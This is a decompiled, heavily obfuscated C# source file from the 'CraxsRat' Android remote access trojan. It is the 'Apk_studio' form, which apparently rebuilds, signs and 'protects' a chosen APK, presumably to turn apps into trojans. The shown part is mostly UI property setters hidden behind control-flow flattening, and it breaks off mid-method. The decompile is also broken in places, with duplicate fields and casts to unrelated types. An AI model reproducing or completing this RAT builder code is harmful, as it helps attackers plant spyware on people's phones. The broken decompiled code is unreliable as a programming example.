// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Apk_studio
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class Apk_studio : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    public string tmpFolderUSER;
    public string tmpClientName;
    public string tmpCountry;
    public string tmpAddressIP;
    private bool BoxTitlePaintEventArgsWait;
    public static readonly AccountManager._Closure\u0024__ \u0024I;
    public static WaitCallback \u0024IR55\u002D1;
    public static WaitCallback \u0024IR56\u002D2;
    private IContainer components;
    private List<Rectangle> RectInputText0;
    private IContainer components;

    [field: AccessedThroughProperty("toppanel")]
    internal virtual Panel toppanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUITextBox TargetApktext
    {
      get => this._TargetApktext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TargetApktext_TextChanged);
        DrakeUITextBox targetApktext = this._TargetApktext;
        if (targetApktext == null)
          goto label_6;
label_1:
        int num1 = -1346354435;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~-num1 * -1997563009 ^ 1516510161 * (1302133140 - 2126535785))) % 6U)
          {
            case 0:
              targetApktext.TextChanged += eventHandler;
              num1 = (int) num2 * 1182195839 ^ 192628943;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              targetApktext = this._TargetApktext;
              int num3 = targetApktext == null ? -1850696882 : (num3 = 551191783);
              num1 = num3 ^ (int) num2 * 451997217;
              continue;
            case 4:
              goto label_6;
            case 5:
              targetApktext.TextChanged -= eventHandler;
              num1 = (int) num2 * -2119392456 ^ 859982254;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        this._TargetApktext = value;
        num1 = 456978057;
        goto label_2;
      }
    }

    internal virtual Button selectapkbtn
    {
      get => this._selectapkbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Selectapkbtn_Click);
label_1:
        int num1 = -103823676;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button selectapkbtn;
          switch ((num3 = (uint) (-326060383 - (--(-559350137 - -1103769421 - ~num2) ^ ~-2009647470))) % 9U)
          {
            case 0:
              int num4 = selectapkbtn == null ? -1155256387 : (num4 = -892272467);
              num1 = num4 ^ (int) num3 * 297691240;
              continue;
            case 1:
              this._selectapkbtn = value;
              num1 = -576055199;
              continue;
            case 2:
              goto label_1;
            case 3:
              selectapkbtn = this._selectapkbtn;
              num1 = (int) num3 * -781447750 ^ 116591024;
              continue;
            case 4:
              selectapkbtn = this._selectapkbtn;
              num1 = (int) num3 * 195143951 ^ -852280061;
              continue;
            case 5:
              selectapkbtn.Click -= eventHandler;
              num1 = (int) num3 * -951160997 ^ 1524176355;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num5 = selectapkbtn == null ? -1288931419 : (num5 = 132977949);
              num1 = num5 ^ (int) num3 * -843018353;
              continue;
            case 8:
              selectapkbtn.Click += eventHandler;
              num1 = (int) num3 * 1163609915 ^ 128573307;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    [field: AccessedThroughProperty("workpanel")]
    internal virtual Panel workpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button savebtn
    {
      get => this._savebtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
label_1:
        int num1 = -166696317;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button savebtn;
          switch ((num3 = (uint) (-(--((257283890 + 1751979219 ^ 1838191586 + 1549082403 ^ ~(-1448754517 - -1443341483)) + (~(-459736778 - -178686339) ^ -1773512692 - 2142837682 + (1652341400 + 520228349)) - ((-2037555821 - -733256259) * -1736398087 + (905354195 - -1078582291) * -1833504211 ^ ~886631257) - num2) - 356004411) + 723121798)) % 7U)
          {
            case 0:
              int num4 = savebtn == null ? -1083052920 : (num4 = -1151522999);
              num1 = num4 ^ (int) num3 * -1401583762;
              continue;
            case 1:
              savebtn.Click -= eventHandler;
              num1 = (int) num3 * -2111225462 ^ -1486409026;
              continue;
            case 2:
              savebtn.Click += eventHandler;
              num1 = (int) num3 * 715526314 ^ 1279515968;
              continue;
            case 3:
              savebtn = this._savebtn;
              int num5 = savebtn == null ? -2020365626 : (num5 = -1724962049);
              num1 = num5 ^ (int) num3 * -1750689646;
              continue;
            case 4:
              goto label_1;
            case 5:
              this._savebtn = value;
              savebtn = this._savebtn;
              num1 = -739135411;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("apkicon")]
    internal virtual PictureBox apkicon { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual BackgroundWorker BackgroundWorker1
    {
      get => this._BackgroundWorker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.BackgroundWorker1_DoWork);
label_1:
        int num1 = 1843457099;
        BackgroundWorker backgroundWorker1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~(num1 * 193190885 * -300399127) * 692268255) * -1759902207)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              backgroundWorker1.DoWork -= workEventHandler;
              num1 = (int) num2 * -1044723092 ^ 1065963258;
              continue;
            case 2:
              backgroundWorker1 = this._BackgroundWorker1;
              num1 = (int) num2 * -999209303 ^ 1041391964;
              continue;
            case 3:
              this._BackgroundWorker1 = value;
              backgroundWorker1 = this._BackgroundWorker1;
              int num3;
              num1 = num3 = backgroundWorker1 == null ? -1843975511 : (num3 = 218104323);
              continue;
            case 4:
              backgroundWorker1.DoWork += workEventHandler;
              num1 = (int) num2 * -200569777 ^ -1155153055;
              continue;
            case 5:
              int num4 = backgroundWorker1 == null ? 1670841694 : (num4 = -1803997917);
              num1 = num4 ^ (int) num2 * 1631285148;
              continue;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button debtn
    {
      get => this._debtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
label_1:
        int num1 = -1835653941;
        Button debtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((num1 ^ -(281366613 - 467268719 + --1601530184 - 1770975853 * ~751470479) + (~-1580573677 + ((1838615574 - 1493225167 ^ -1218631224 * 1271519667) + (896847642 - (340897731 ^ -1329830505)))) ^ -(---1616170578 ^ -869904593 * -319877418)) + (1652733278 - 1726124461 + (1462619267 - 1748071343) + (623411869 * 1177395105 - 1296533236))) ^ 195295407 - -1476144639)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              debtn.Click += eventHandler;
              num1 = (int) num2 * 2141654471 ^ -1687583153;
              continue;
            case 2:
              this._debtn = value;
              debtn = this._debtn;
              num1 = -1651647218;
              continue;
            case 3:
              debtn.Click -= eventHandler;
              num1 = (int) num2 * -993331759 ^ -22452972;
              continue;
            case 4:
              goto label_1;
            case 5:
              debtn = this._debtn;
              int num3 = debtn == null ? 619913498 : (num3 = 1328602758);
              num1 = num3 ^ (int) num2 * -1544053740;
              continue;
            case 6:
              int num4 = debtn == null ? 165525573 : (num4 = 2120359174);
              num1 = num4 ^ (int) num2 * -1363286501;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("workdirtext")]
    internal virtual DrakeUITextBox workdirtext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Panel titlespanel
    {
      get => ((Apk_studio._Closure\u0024__114\u002D0) this)._titlespanel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Apk_studio._Closure\u0024__114\u002D0) this)._titlespanel = value;
      }
    }

    internal virtual Label pkgtext
    {
      get => ((Apk_studio._Closure\u0024__114\u002D0) this)._pkgtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
        Label pkgtext = ((Apk_studio._Closure\u0024__114\u002D0) this)._pkgtext;
label_1:
        int num1 = -1949759691;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ~(~(-(-(~~-639418704 ^ -1326420052) - -1639594067 * ((-1535062941 ^ -573564858) + 863781686 + (665731628 + (-1415244385 ^ 376363707))) - num2) ^ ---1278847914 * 304595967) - 1940001475)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              pkgtext = ((Apk_studio._Closure\u0024__114\u002D0) this)._pkgtext;
              num1 = (int) num3 * -1433226600 ^ -1729100584;
              continue;
            case 2:
              goto label_3;
            case 3:
              pkgtext.Click -= eventHandler;
              num1 = (int) num3 * 600066719 ^ -190185485;
              continue;
            case 4:
              int num4 = pkgtext == null ? -406486082 : (num4 = 391104103);
              num1 = num4 ^ (int) num3 * 797197067;
              continue;
            case 5:
              int num5 = pkgtext == null ? 1757737961 : (num5 = 264734104);
              num1 = num5 ^ (int) num3 * -1052147045;
              continue;
            case 6:
              ((Apk_studio._Closure\u0024__114\u002D0) this)._pkgtext = value;
              num1 = -1715939407;
              continue;
            case 7:
              pkgtext.Click += eventHandler;
              num1 = (int) num3 * 873329194 ^ -689906620;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label nametext
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._nametext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
label_1:
        int num1 = 1990541254;
        Label nametext;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((~(num1 * 1200458435) * 1374105093 - 1833773861 ^ --1878953974) * -1388500687)) % 9U)
          {
            case 0:
              nametext = ((Apk_studio._Closure\u0024__116\u002D0) this)._nametext;
              num1 = (int) num2 * -68778539 ^ -23750460;
              continue;
            case 1:
              nametext = ((Apk_studio._Closure\u0024__116\u002D0) this)._nametext;
              num1 = (int) num2 * 194869802 ^ -1838527474;
              continue;
            case 2:
              int num3 = nametext == null ? 1884732673 : (num3 = 1318360831);
              num1 = num3 ^ (int) num2 * 45942620;
              continue;
            case 3:
              nametext.Click -= eventHandler;
              num1 = (int) num2 * 188761371 ^ 2003534064;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._nametext = value;
              num1 = 1362444873;
              continue;
            case 7:
              int num4 = nametext == null ? -1298853123 : (num4 = 1267006874);
              num1 = num4 ^ (int) num2 * -1105594627;
              continue;
            case 8:
              nametext.Click += eventHandler;
              num1 = (int) num2 * -1128646738 ^ -528070686;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual Label andfromtext
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._andfromtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
        Label andfromtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._andfromtext;
label_1:
        int num1 = -1700322116;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-(num1 * 1727707051) * 798921109 - 1275374852) ^ -1950832773)) % 8U)
          {
            case 0:
              int num3 = andfromtext == null ? 146490690 : (num3 = -2036441274);
              num1 = num3 ^ (int) num2 * -993167825;
              continue;
            case 1:
              andfromtext.Click -= eventHandler;
              num1 = (int) num2 * -771023804 ^ 2022894607;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._andfromtext = value;
              num1 = 957906343;
              continue;
            case 4:
              int num4 = andfromtext == null ? 1691997787 : (num4 = -33855383);
              num1 = num4 ^ (int) num2 * -110355628;
              continue;
            case 5:
              goto label_1;
            case 6:
              andfromtext.Click += eventHandler;
              num1 = (int) num2 * 1156748155 ^ 190553856;
              continue;
            case 7:
              andfromtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._andfromtext;
              num1 = (int) num2 * 1830022185 ^ 437374135;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label vernamtext
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._vernamtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
label_1:
        int num1 = -1237812967;
        Label vernamtext;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~-(~num1 ^ ~(162481906 - 1773401910 ^ -475328833 * 825215637) - (332425720 ^ -1786223506 ^ 896956238 - 1978405597 ^ -(-1871791191 ^ -1787065586)) ^ 1498626827 * -1785159027 - 1206054596 + (1764948260 - -1768806455 - 742795661 * -1923673431)) - 722480472)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num3 = vernamtext == null ? 1162659344 : (num3 = 761223116);
              num1 = num3 ^ (int) num2 * 997255307;
              continue;
            case 3:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._vernamtext = value;
              vernamtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._vernamtext;
              num1 = -79737665;
              continue;
            case 4:
              vernamtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._vernamtext;
              num1 = (int) num2 * 1329908695 ^ 1631811175;
              continue;
            case 5:
              vernamtext.Click += eventHandler;
              num1 = (int) num2 * -93948893 ^ 838139241;
              continue;
            case 6:
              int num4 = vernamtext == null ? 1322525278 : (num4 = 1094721914);
              num1 = num4 ^ (int) num2 * 1993195209;
              continue;
            case 7:
              vernamtext.Click -= eventHandler;
              num1 = (int) num2 * -314543187 ^ 1264298923;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label vercodtext
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._vercodtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
label_1:
        int num1 = -741903517;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Label vercodtext;
          switch ((num3 = (uint) (~(-(-2088594675 - 2050669155 ^ 2010364187 - 793732679) - (num2 + (604310245 * -1258811413 ^ -16120551 * (--413672450 ^ (-1775836621 - 1424440174) * 1285473351))) * 43892799) + -611406653 * -2020353247 ^ 120842749)) % 8U)
          {
            case 0:
              goto label_3;
            case 1:
              vercodtext.Click -= eventHandler;
              num1 = (int) num3 * 1681994259 ^ -461531311;
              continue;
            case 2:
              vercodtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._vercodtext;
              int num4 = vercodtext == null ? 534652054 : (num4 = 231807090);
              num1 = num4 ^ (int) num3 * 2122652118;
              continue;
            case 3:
              goto label_1;
            case 4:
              int num5 = vercodtext == null ? -1531696959 : (num5 = -1200404573);
              num1 = num5 ^ (int) num3 * -1289851355;
              continue;
            case 5:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._vercodtext = value;
              num1 = 711765456;
              continue;
            case 6:
              vercodtext.Click += eventHandler;
              num1 = (int) num3 * -1915360322 ^ 1550221737;
              continue;
            case 7:
              vercodtext = ((Apk_studio._Closure\u0024__116\u002D0) this)._vercodtext;
              num1 = (int) num3 * -846018679 ^ 461982438;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label andtotext
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._andtotext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Andtotext_Click);
label_1:
        int num1 = 919892965;
        Label andtotext;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-(num1 - (--(119787234 - 882192431) + ~(1317382409 * -757438682) ^ (-(1019093203 + 1259229920) ^ 1095180907) - (-(1036842106 ^ 2027837197) ^ ~-474135395 * 390920667))) * 2017369521) * 1675273937 - 752736565)) % 7U)
          {
            case 0:
              andtotext.Click -= eventHandler;
              num1 = (int) num2 * -403239437 ^ -1838732325;
              continue;
            case 1:
              andtotext.Click += eventHandler;
              num1 = (int) num2 * -754810209 ^ -1859195643;
              continue;
            case 2:
              goto label_1;
            case 3:
              andtotext = ((Apk_studio._Closure\u0024__116\u002D0) this)._andtotext;
              int num3 = andtotext == null ? 1324584854 : (num3 = -1603300864);
              num1 = num3 ^ (int) num2 * 759874418;
              continue;
            case 4:
              goto label_3;
            case 5:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._andtotext = value;
              num1 = -892182927;
              continue;
            case 6:
              andtotext = ((Apk_studio._Closure\u0024__116\u002D0) this)._andtotext;
              int num4 = andtotext == null ? 1255387306 : (num4 = 1552186514);
              num1 = num4 ^ (int) num2 * 846731537;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button sinbtn
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._sinbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
        Button sinbtn = ((Apk_studio._Closure\u0024__116\u002D0) this)._sinbtn;
label_1:
        int num1 = -251879165;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(num1 ^ (-((1818188928 - 1905422573) * -1476761489) ^ --2050992071) + (-(1038136554 ^ -1837094830) - (-1271102454 ^ 894244230) * -915994873) ^ -((-118033401 ^ -1811967597) + (1772798475 ^ -1367912066) ^ 1278829817))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              sinbtn.Click -= eventHandler;
              num1 = (int) num2 * -1580863977 ^ -1769186659;
              continue;
            case 3:
              int num3 = sinbtn == null ? -1880548819 : (num3 = -756726888);
              num1 = num3 ^ (int) num2 * 730796632;
              continue;
            case 4:
              sinbtn.Click += eventHandler;
              num1 = (int) num2 * 1341731495 ^ -1054930775;
              continue;
            case 5:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._sinbtn = value;
              sinbtn = ((Apk_studio._Closure\u0024__116\u002D0) this)._sinbtn;
              int num4;
              num1 = num4 = sinbtn == null ? -461778979 : (num4 = -1260918148);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Button cobtn
    {
      get => ((Apk_studio._Closure\u0024__116\u002D0) this)._cobtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button4_Click);
label_1:
        int num1 = -710539890;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Button cobtn;
          switch ((num3 = (uint) ~(-((-(-334332401 ^ ~--1033302791) - ~num2) * -1420819725) ^ 1206036215 * 1593151892)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              ((Apk_studio._Closure\u0024__116\u002D0) this)._cobtn = value;
              num1 = -1809623775;
              continue;
            case 2:
              goto label_3;
            case 3:
              cobtn = ((Apk_studio._Closure\u0024__116\u002D0) this)._cobtn;
              int num4 = cobtn == null ? -865895242 : (num4 = -501220639);
              num1 = num4 ^ (int) num3 * 1540019882;
              continue;
            case 4:
              cobtn = ((Apk_studio._Closure\u0024__116\u002D0) this)._cobtn;
              num1 = (int) num3 * -1506678700 ^ 1581554868;
              continue;
            case 5:
              int num5 = cobtn == null ? 1265349506 : (num5 = 198232131);
              num1 = num5 ^ (int) num3 * -1099156739;
              continue;
            case 6:
              cobtn.Click -= eventHandler;
              num1 = (int) num3 * -1603537052 ^ 1496192864;
              continue;
            case 7:
              cobtn.Click += eventHandler;
              num1 = (int) num3 * -1478323700 ^ 557302407;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Button probtn
    {
      get => ((Apk_studio._Closure\u0024__120\u002D0) this)._probtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button5_Click);
        Button probtn = ((Apk_studio._Closure\u0024__120\u002D0) this)._probtn;
label_1:
        int num1 = -1003334866;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-num1 - (-(-1251685567 - -1280816963 ^ -556544848) ^ -1286945460) + -(471885167 + 1190393349 ^ ~-150819932)) ^ -1877983859 - -949158055 ^ 547605099)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              probtn.Click += eventHandler;
              num1 = (int) num2 * -684379496 ^ -356626958;
              continue;
            case 2:
              ((Apk_studio._Closure\u0024__120\u002D0) this)._probtn = value;
              num1 = -258722981;
              continue;
            case 3:
              int num3 = probtn == null ? -877649737 : (num3 = -1913695667);
              num1 = num3 ^ (int) num2 * 1050155968;
              continue;
            case 4:
              probtn.Click -= eventHandler;
              num1 = (int) num2 * 1106510924 ^ 227737671;
              continue;
            case 5:
              int num4 = probtn == null ? -1659864736 : (num4 = -1158166070);
              num1 = num4 ^ (int) num2 * -859482542;
              continue;
            case 6:
              probtn = ((Apk_studio._Closure\u0024__120\u002D0) this)._probtn;
              num1 = (int) num2 * -313405446 ^ -1465608120;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual BackgroundWorker protectworker
    {
      get => ((Apk_studio._Closure\u0024__120\u002D0) this)._protectworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.Protectworker_DoWork);
label_1:
        int num1 = -430583987;
        while (true)
        {
          int num2 = num1;
          uint num3;
          BackgroundWorker protectworker;
          switch ((num3 = (uint) (-505364841 - ~((1004315607 - 1982968388 ^ --1906174034) - ~((-(--894638323 ^ ~1586568212) - 410571738 + ~(-1695651768 - (-2119886719 - 1703235972)) * -1978384409 - num2) * -1236680451)))) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              protectworker = ((Apk_studio._Closure\u0024__120\u002D0) this)._protectworker;
              num1 = (int) num3 * -1257527082 ^ 382193353;
              continue;
            case 2:
              ((Apk_studio._Closure\u0024__120\u002D0) this)._protectworker = value;
              num1 = 1599658727;
              continue;
            case 3:
              goto label_1;
            case 4:
              protectworker.DoWork -= workEventHandler;
              num1 = (int) num3 * -115373433 ^ 1716582128;
              continue;
            case 5:
              int num4 = protectworker == null ? 26040248 : (num4 = 2115021130);
              num1 = num4 ^ (int) num3 * 1646348745;
              continue;
            case 6:
              protectworker = ((Apk_studio._Closure\u0024__120\u002D0) this)._protectworker;
              num1 = (int) num3 * -1670214319 ^ 1128199018;
              continue;
            case 7:
              protectworker.DoWork += workEventHandler;
              num1 = (int) num3 * 828075561 ^ 1698035500;
              continue;
            case 8:
              int num5 = protectworker == null ? 79280796 : (num5 = 882494556);
              num1 = num5 ^ (int) num3 * -347282207;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual BackgroundWorker deworker
    {
      get => ((Apk_studio._Closure\u0024__122\u002D0) this)._deworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.Deworker_DoWork);
label_1:
        int num1 = -951614340;
        BackgroundWorker deworker;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~-num1 * 748703695 - ~(-1702404449 * 311485315))) % 9U)
          {
            case 0:
              int num3 = deworker == null ? 2136936208 : (num3 = 731118764);
              num1 = num3 ^ (int) num2 * 655673291;
              continue;
            case 1:
              deworker = ((Apk_studio._Closure\u0024__122\u002D0) this)._deworker;
              num1 = (int) num2 * 748190644 ^ -481409082;
              continue;
            case 2:
              deworker = ((Apk_studio._Closure\u0024__122\u002D0) this)._deworker;
              num1 = (int) num2 * -193057768 ^ -1546864890;
              continue;
            case 3:
              deworker.DoWork += workEventHandler;
              num1 = (int) num2 * 1634582841 ^ 834863848;
              continue;
            case 4:
              goto label_1;
            case 5:
              ((Apk_studio._Closure\u0024__122\u002D0) this)._deworker = value;
              num1 = -1096004231;
              continue;
            case 6:
              int num4 = deworker == null ? 275308364 : (num4 = 419149940);
              num1 = num4 ^ (int) num2 * 857379706;
              continue;
            case 7:
              goto label_3;
            case 8:
              deworker.DoWork -= workEventHandler;
              num1 = (int) num2 * -771940395 ^ 2002865924;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual BackgroundWorker COworker
    {
      get => ((Apk_studio._Closure\u0024__122\u002D0) this)._COworker;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        DoWorkEventHandler workEventHandler = new DoWorkEventHandler(this.COworker_DoWork);
label_1:
        int num1 = -1114717034;
        BackgroundWorker coworker;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~((~num1 ^ ~-799937206) - 241531939) * -2103303895)) % 8U)
          {
            case 0:
              coworker.DoWork += workEventHandler;
              num1 = (int) num2 * 1633116356 ^ -258452519;
              continue;
            case 1:
              goto label_3;
            case 2:
              coworker = ((Apk_studio._Closure\u0024__122\u002D0) this)._COworker;
              num1 = (int) num2 * -2121878595 ^ -1276525183;
              continue;
            case 3:
              ((Apk_studio._Closure\u0024__122\u002D0) this)._COworker = value;
              num1 = 2049225708;
              continue;
            case 4:
              coworker = ((Apk_studio._Closure\u0024__122\u002D0) this)._COworker;
              int num3 = coworker == null ? -1320368667 : (num3 = -1774716628);
              num1 = num3 ^ (int) num2 * 2128023711;
              continue;
            case 5:
              goto label_1;
            case 6:
              coworker.DoWork -= workEventHandler;
              num1 = (int) num2 * 1979245661 ^ 2092724513;
              continue;
            case 7:
              int num4 = coworker == null ? -953735070 : (num4 = 840641215);
              num1 = num4 ^ (int) num2 * 2042887387;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((Apk_studio._Closure\u0024__124\u002D0) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Apk_studio._Closure\u0024__124\u002D0) this)._Panel1 = value;
      }
    }

    internal virtual RichTextBox logtext
    {
      get => ((Apk_studio._Closure\u0024__124\u002D0) this)._logtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Apk_studio._Closure\u0024__124\u002D0) this)._logtext = value;
      }
    }

    public Apk_studio()
    {
      this.Load += new EventHandler(this.Apk_studio_Load);
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__124\u002D0) this).TargetAPKPATH = EXGuarder.\u003274F1614;
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__124\u002D1) this).TargetAPKNAME = EXGuarder.\u003274F1614;
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__124\u002D1) this).TargetWorkPATH = EXGuarder.\u003274F1614;
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__125\u002D0) this).craxsStudioPath = EXGuarder.\u003274F1614;
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__125\u002D0) this).APKINFO = EXGuarder.\u003274F1614;
      // ISSUE: reference to a compiler-generated field
      ((Apk_studio._Closure\u0024__125\u002D0) this).Apkeditorpath = EXGuarder.\u003274F1614;
      ((AddNumber) this).InitializeComponent();
    }

    public void log(string str)
    {
      // ISSUE: variable of a compiler-generated type
      Apk_studio._Closure\u0024__114\u002D0 TargetObject = (Apk_studio._Closure\u0024__114\u002D0) new Apk_studio();
label_1:
      int num1 = -399568532;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-((num1 ^ ---977793592 + --(385672171 - --1204899255)) * 1796141719 ^ ~-1626864653 ^ 402557855 - -1136521124 - -1234354160 * 310220251) - -1677261961)) % 3U)
        {
          case 1:
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__125\u002D1) TargetObject).\u0024VB\u0024Me = this;
            // ISSUE: reference to a compiler-generated field
            ((Apk_studio._Closure\u0024__125\u002D1) TargetObject).\u0024VB\u0024Local_str = str;
            num1 = (int) num2 * -2139365206 ^ 1637228051;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      // ISSUE: method pointer
      this.Invoke((Delegate) new EXGuarder((object) TargetObject, __methodptr(_Lambda\u0024__0)));
    }

    private void Selectapkbtn_Click(object sender, EventArgs e)
    {
      if (!this.BackgroundWorker1.IsBusy)
        goto label_10;
label_1:
      int num1 = -2060348634;
label_2:
      OpenFileDialog openFileDialog;
      while (true)
      {
        int num2 = num1;
        uint num3;
        string directoryName;
